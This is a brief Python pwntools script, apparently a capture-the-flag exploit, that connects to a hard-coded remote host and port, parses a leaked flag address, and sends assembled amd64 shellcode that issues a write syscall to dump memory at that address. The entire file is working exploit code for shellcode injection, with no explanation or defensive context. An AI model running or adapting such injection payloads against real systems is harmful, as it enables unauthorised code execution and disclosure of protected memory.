from pwn import *
from icecream import ic

io = remote("54.85.45.101", 8005)
context.log_level = 'debug'
context.arch = 'amd64'

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

ru("Flag is at ")
flag = int(rl().strip(), 16)

payload = asm(f"""
    mov rax, 1
    mov rdi, 1
    mov rsi, {flag}
    mov rdx, 100
    syscall
""")
sl(payload)

io.interactive()